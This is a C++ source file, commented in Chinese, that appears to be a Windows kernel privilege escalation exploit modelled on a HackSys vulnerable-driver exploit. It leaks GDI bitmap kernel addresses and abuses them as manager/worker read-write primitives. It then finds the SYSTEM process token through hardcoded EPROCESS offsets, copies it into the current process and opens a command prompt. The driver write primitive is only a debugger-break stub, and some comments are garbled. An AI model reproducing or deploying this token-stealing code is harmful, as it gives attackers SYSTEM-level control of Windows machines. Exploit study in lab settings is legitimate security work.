#include <Windows.h>
#include <Psapi.h>
#include <iostream>

/*
* popCmdToConfirm:
*	[+] 弹出cmd窗口验证提权是否成功
*	[+] 来源: https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI/blob/master/HS-ArbitraryOverwriteGDI/HS-ArbitraryOverwriteGDI.c#L236
*/
VOID popCmdToConfirm()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

DWORD64 getGdiShreadHandleTableAddr()
{
	DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
	DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);   // 0x60ÊÇPEBµÄÆ«ÒÆ
	DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
	return GdiShreadHandleTableAddr;
}

DWORD64 getBitMapAddr(HBITMAP hBitmap)
{
	WORD arrayIndex = LOWORD(hBitmap);
	return *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * 0x18);
}

DWORD64 getKernelBase()
{
	LPVOID lpImageBase[0x100];
	DWORD64 cb = sizeof(lpImageBase);
	LPDWORD lpcbNeeded = NULL;
	TCHAR baseName[1024];

	EnumDeviceDrivers(lpImageBase, cb, lpcbNeeded);

	for (int i = 0; i < 10; i++)
	{
		// 获取基地址的信息
		GetDeviceDriverBaseNameA(lpImageBase[i], baseName, 0x40);

		if (!strncmp(baseName, "nt", 2))
		{
			std::cout << "[+] basename: " << baseName << std::endl;
			std::cout << "[+] nt! at kernel space: " << lpImageBase[i] << std::endl;
			return (DWORD64)lpImageBase[i];
		}
	}
	return 0;
}

DWORD64 getSystemProcessAddress()
{
	// 找到SYSTEM RROCESS TOKEN ADDRESS
	DWORD64 NtUserSpaceAddr = (DWORD64)LoadLibrary("ntoskrnl.exe");	// 这个地方根据实际结果改下名字即可
	DWORD64 NtKernelSpaceAddr = getKernelBase();
	DWORD64 PsInitialSystemProcessUserSpaceAddr = (DWORD64)GetProcAddress((HMODULE)NtUserSpaceAddr, "PsInitialSystemProcess");
	DWORD64 PsInitialSystemProcessKernelSpaceAddr = PsInitialSystemProcessUserSpaceAddr + (NtKernelSpaceAddr - NtUserSpaceAddr);
	
	std::cout << "[+] System Process could find at here: " << std::hex << PsInitialSystemProcessKernelSpaceAddr << std::endl;
	return PsInitialSystemProcessKernelSpaceAddr;
}

VOID write_what_where_qword(DWORD64 whereWrite, DWORD64 whatWrite)
{
	__debugbreak();
}

VOID readOOB(HBITMAP hManager,  HBITMAP hWorker, DWORD64 whereWrite, LPVOID whatWrite, int len)
{
	SetBitmapBits(hManager, len, &whereWrite);
	GetBitmapBits(hWorker, len, whatWrite);
}

VOID writeOOB(HBITMAP hManager, HBITMAP hWorker, DWORD64 whereWrite, LPVOID whatWrite, int len)
{
	SetBitmapBits(hManager, len, &whereWrite);
	SetBitmapBits(hWorker, len, &whatWrite);
}

VOID getSystemShell()
{
	CHAR pvScan0[] = "AAAA";
	HBITMAP hManagerBitmap = CreateBitmap(0x20, 0x2, 0x1, 0x8, pvScan0);
	HBITMAP hWorkerBitmap = CreateBitmap(0x20, 0x2, 0x1, 0x8, pvScan0);
	DWORD64 leakManagerAddr = getBitMapAddr(hManagerBitmap);
	__debugbreak();	// 获取hManager的地址

	std::cout << "[+] Manager Bitmap Addr: " << std::hex << leakManagerAddr << std::endl;
	DWORD64 leakWorkerAddr = getBitMapAddr(hWorkerBitmap);
	__debugbreak();	// 获取hWorker的地址
	std::cout << "[+] Worker Bitmap Addr: " << std::hex << leakWorkerAddr << std::endl;

	write_what_where_qword(leakManagerAddr, leakWorkerAddr);	// 替换hMnagerPvscan0的值为hWorker.pvScan0

	DWORD64 systemEprocessAddr = 0;
	LPVOID lpSystemToken = NULL;
	readOOB(hManagerBitmap, hWorkerBitmap,  getSystemProcessAddress(), &systemEprocessAddr, sizeof(DWORD64));
	std::cout << "[+] system Eprocess At: " << systemEprocessAddr << std::endl;
	readOOB(hManagerBitmap, hWorkerBitmap, (systemEprocessAddr + 0x348), &lpSystemToken, sizeof(DWORD64));
	std::cout << "[+] System Process Token is: " << std::hex << (DWORD64)lpSystemToken << std::endl;
	
	// 下面的代码获取当前进程的_EPROCESS地址
	DWORD64 lpNextEPROCESS = 0;
	LPVOID lpCurrentPID = NULL;
	DWORD dwCurrentPID;
	LIST_ENTRY lpNextEntryAddreess = {};
	DWORD64 currentProcessID = GetCurrentProcessId();	// 通过PID判断是否获取到当前进程的地址
	readOOB(hManagerBitmap, hWorkerBitmap, systemEprocessAddr + 0x2e8, &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	do	// 根据PID是否找到当前进程 
	{
		// 获取下一个进程
		lpNextEPROCESS = (DWORD64)((PUCHAR)lpNextEntryAddreess.Flink - 0x2e8);
		// 获取PID
		readOOB(hManagerBitmap, hWorkerBitmap, lpNextEPROCESS + 0x2e0, &lpCurrentPID, sizeof(LPVOID));
		dwCurrentPID = LOWORD(lpCurrentPID);
		readOOB(hManagerBitmap, hWorkerBitmap, lpNextEPROCESS + 0x2e8, &lpNextEntryAddreess, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != currentProcessID);

	DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x348;
	std::cout << "[+] Current Eprocess Address is: " << std::hex << currentTokenAddress << std::endl;
	writeOOB(hManagerBitmap, hWorkerBitmap, currentTokenAddress, lpSystemToken, sizeof(LPVOID));	// 将system Token的值给currentProcess的值.
}

int main()
{
	getSystemShell();
	popCmdToConfirm();
	system("pause");
	return 0;
}